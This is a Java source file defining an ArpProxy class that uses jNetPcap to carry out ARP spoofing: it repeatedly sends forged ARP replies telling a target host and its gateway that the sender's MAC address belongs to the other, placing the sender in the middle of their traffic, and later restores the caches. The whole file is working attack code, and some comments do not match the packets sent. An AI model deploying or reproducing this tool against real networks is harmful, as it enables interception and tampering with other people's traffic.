package Arp;

import org.jnetpcap.Pcap;

public class ArpProxy {
    Pcap pcap;
    byte[] targIp;
    byte[] targMac;
    byte[] myIp;
    byte[] myMac;
    byte[] gateIp;
    byte[] gateMac;

    ArpPacket targReply;
    ArpPacket targRequest;
    ArpPacket gateReply;
    ArpPacket gateRequest;

    ArpPacket heal_targReply;
    ArpPacket heal_gateReply;

    boolean runProxy = false;

    public ArpProxy(Pcap pcap,byte[] targIp,byte[] targMac,byte[] myIp,byte[] myMac,byte[] gateIp,byte[] gateMac){
        this.pcap = pcap;
        this.targIp = targIp;
        this.targMac = targMac;
        this.myIp = myIp;
        this.myMac = myMac;
        this.gateIp = gateIp;
        this.gateMac = gateMac;

        // enable proxy
        targRequest = new ArpPacket(ArpPacket.Opcode.REQUEST,targMac,targIp,gateIp,null);
        targReply = new ArpPacket(ArpPacket.Opcode.REPLY,myMac,gateIp,targIp,targMac);
        gateRequest = new ArpPacket(ArpPacket.Opcode.REQUEST,gateMac,gateIp,targIp,null);
        gateReply = new ArpPacket(ArpPacket.Opcode.REPLY,myMac,targIp,gateIp,gateMac);

        // heal connection
        heal_targReply = new ArpPacket(ArpPacket.Opcode.REPLY,gateMac,gateIp,targIp,targMac);
        heal_gateReply = new ArpPacket(ArpPacket.Opcode.REPLY,targMac,targIp,gateIp,gateMac);
    }

    public void startProxy(long interval){
        runProxy = true;

        while(runProxy) {

            // ask target who has gateway
            pcap.sendPacket(targRequest.getBytes());
            // tell target gateway is me
            pcap.sendPacket(targReply.getBytes());

            // ask gateway who has target
            pcap.sendPacket(gateReply.getBytes());
            // tell gateway target is me
            pcap.sendPacket(gateRequest.getBytes());

            // pause for next iteration
            try {
                Thread.sleep(interval);
            }catch (Exception e){}
        }


    }

    public void endProxy(){

        // heal the connection to the initial state
        runProxy = false;

        // ask target who has gateway
        pcap.sendPacket(targRequest.getBytes());

        // tell target gateway is gateway
        pcap.sendPacket(heal_targReply.getBytes());

        // ask gateway who has target
        pcap.sendPacket(gateReply.getBytes());

        // tell gateway target is target
        pcap.sendPacket(heal_gateReply.getBytes());

    }

}
